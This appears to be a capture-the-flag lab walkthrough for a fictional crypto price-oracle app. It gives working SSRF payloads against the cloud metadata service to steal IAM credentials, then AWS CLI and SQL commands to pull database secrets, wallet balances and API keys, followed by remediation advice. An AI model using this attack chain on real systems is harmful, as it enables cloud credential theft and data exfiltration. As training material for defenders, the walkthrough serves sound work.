# ChainPulse - Walkthrough

## Phase 1: Application Reconnaissance

### Objective
Understand the application's functionality and identify potential attack vectors.

### Steps

1. **Access the application**

   Navigate to `http://[instance-ip]:8080` in your browser.

2. **Explore the interface**

   The ChainPulse application is a price oracle aggregator for a crypto trading platform. Note the key functionality:
   - Oracle Feed Validator - validates external price oracle URLs
   - Active Price Oracles - shows connected price feeds
   - System Metrics - displays trading volume and statistics

3. **Identify the validation endpoint**

   The "Oracle Feed Validator" accepts URLs and fetches their content. This is a classic pattern for SSRF vulnerabilities.

4. **Test with an external URL**

   ```
   https://httpbin.org/get
   ```

   Observe that the application fetches the URL and displays the response content.

---

## Phase 2: SSRF Identification

### Objective
Confirm the SSRF vulnerability and test internal resource access.

### Steps

1. **Test localhost access**

   Enter in the validator:
   ```
   http://localhost:8080/health
   ```

   The application fetches its own health endpoint, confirming SSRF.

2. **Test internal IP access**

   Try accessing the AWS metadata service:
   ```
   http://169.254.169.254/
   ```

   If successful, you'll see the metadata API version listing.

3. **Enumerate metadata endpoints**

   ```
   http://169.254.169.254/latest/meta-data/
   ```

   This reveals available metadata categories including `iam/`.

---

## Phase 3: IMDS Credential Theft

### Objective
Extract IAM role credentials from the Instance Metadata Service.

### Steps

1. **Identify the IAM role**

   ```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ```

   This returns the role name attached to the instance (e.g., `chainpulse-webapp-abc123`).

2. **Retrieve temporary credentials**

   ```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
   ```

   Replace `[role-name]` with the actual role name from step 1.

3. **Extract the credentials**

   The response contains:
   - `AccessKeyId`
   - `SecretAccessKey`
   - `Token` (session token)
   - `Expiration`

4. **Note the instance ID**

   You'll need this for SSM access later:
   ```
   http://169.254.169.254/latest/meta-data/instance-id
   ```

### Key Learning

IMDSv1 allows simple HTTP GET requests to retrieve credentials. IMDSv2 requires a session token obtained via PUT request, which mitigates SSRF attacks since most SSRF vulnerabilities only allow GET requests.

---

## Phase 4: AWS Enumeration

### Objective
Use stolen credentials to enumerate accessible AWS resources.

### Steps

1. **Configure credentials on your attack machine**

   ```bash
   export AWS_ACCESS_KEY_ID="ASIAX..."
   export AWS_SECRET_ACCESS_KEY="..."
   export AWS_SESSION_TOKEN="..."
   export AWS_DEFAULT_REGION="us-east-1"  # Adjust to match lab region
   ```

2. **Verify the credentials**

   ```bash
   aws sts get-caller-identity
   ```

3. **Enumerate permissions**

   ```bash
   # Secrets Manager
   aws secretsmanager list-secrets

   # S3
   aws s3 ls

   # EC2
   aws ec2 describe-instances
   ```

4. **Focus on Secrets Manager**

   The `list-secrets` command reveals a secret related to database credentials:
   ```bash
   aws secretsmanager list-secrets
   ```

   Note the secret name (e.g., `chainpulse/trading-db/credentials-abc123`).

---

## Phase 5: Secrets Manager Extraction

### Objective
Retrieve stored secrets containing database credentials.

### Steps

1. **Get the secret value**

   ```bash
   aws secretsmanager get-secret-value --secret-id chainpulse/trading-db/credentials-abc123
   ```

2. **Parse the response**

   ```json
   {
     "username": "chainpulse_svc",
     "password": "...",
     "host": "chainpulse-trading-abc123.xxxxx.us-east-1.rds.amazonaws.com",
     "port": 5432,
     "dbname": "tradingdb",
     "engine": "postgres"
   }
   ```

3. **Extract with jq**

   ```bash
   aws secretsmanager get-secret-value \
     --secret-id chainpulse/trading-db/credentials-abc123 \
     --query 'SecretString' --output text | jq .
   ```

---

## Phase 6: Database Access and Exfiltration

### Objective
Connect to the database and extract sensitive financial data.

### Steps

1. **Connect via SSM Session Manager**

   The RDS instance is in a private subnet. Use SSM to access the EC2 instance:

   ```bash
   aws ssm start-session --target [instance-id]
   ```

2. **Connect to PostgreSQL**

   From the EC2 instance:
   ```bash
   PGPASSWORD='[password]' psql -h [rds-endpoint] -U chainpulse_svc -d tradingdb
   ```

3. **Enumerate tables**

   ```sql
   \dt
   ```

   Tables: `wallets`, `balances`, `api_keys`, `transactions`, `system_config`

4. **Extract wallet data**

   ```sql
   SELECT * FROM wallets;
   SELECT w.wallet_address, b.asset, b.balance 
   FROM wallets w 
   JOIN balances b ON w.id = b.wallet_id;
   ```

5. **Extract API keys**

   ```sql
   SELECT * FROM api_keys;
   ```

6. **Find the flag**

   ```sql
   SELECT * FROM system_config WHERE is_sensitive = true;
   ```

---

## Remediation

1. **Enable IMDSv2** - Require session tokens for metadata access
2. **Implement URL allowlisting** - Only permit requests to known oracle endpoints
3. **Use private endpoints** - Access Secrets Manager via VPC endpoint
4. **Least privilege IAM** - Scope Secrets Manager access to specific secrets
5. **Network segmentation** - Isolate database tier with strict security groups
6. **Input validation** - Block requests to internal IP ranges (169.254.x.x, 10.x.x.x, etc.)
